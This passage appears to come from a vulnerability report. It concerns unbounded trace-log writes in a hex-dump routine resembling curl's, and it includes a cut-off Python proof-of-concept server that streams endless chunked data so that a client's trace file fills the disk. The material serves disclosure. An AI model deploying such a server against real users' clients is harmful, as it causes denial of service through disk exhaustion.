    if(tracetype == TRACE_BIN) {
        for(c = 0; c < width; c++)
            if(i + c < size)
              fprintf(stream, "%02x ", ptr[i + c]); // <-- Vulnerable write (hex data)
            else
              fputs("   ", stream); // <-- Vulnerable write (padding)
    }

    for(c = 0; (c < width) && (i + c < size); c++) {
        // ...
        fprintf(stream, "%c", ((ptr[i + c] >= 0x20) && (ptr[i + c] < 0x7F)) ?
                     ptr[i + c] : UNPRINTABLE_CHAR); // <-- Vulnerable write (ASCII representation)
        // ...
    }
    fputc('\n', stream); // <-- Vulnerable write (newline character)
}
fflush(stream);
```

In essence, the vulnerability isn't a bug in the fwrite or fprintf calls themselves, but rather the lack of a protective wrapper or check around these calls to limit the cumulative data written to the trace log file. The fix involves adding that missing check.

# POC

1. Unlimited data server setup [unli.py]

```
import http.server
import socketserver
import time

PORT = 8002

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print(f"[{time.ctime()}] Received GET request from {self.client_address[0]}")
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Transfer-Encoding", "chunked")
        # FIX: Changed self0 to self
        self.end_headers()

        # Stream data continuously
        try:
            i = 0
            while True:
                chunk = f"This is chunk {i}: {'A' * 1024}\n".encode('utf-8') # 1KB of data per chunk
                self.wfile.write(f"{len(chunk):X}\r\n".encode('ascii')) # Chunk size in hexadecimal
                self.wfile.write(chunk)
                self.wfile.write(b"\r\n")
                self.wfile.flush()
                i += 1
                # Optional: add a small delay to observe file growth more easily
                # time.sleep(0.01)
        except Exception as e:
            print(f"[{time.ctime()}] Client disconnected or error: {e}")
        finally:
            # End chunked encoding
            self.wfile.write(b"0\r\n\r\n")
            self.wfile.flush()

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
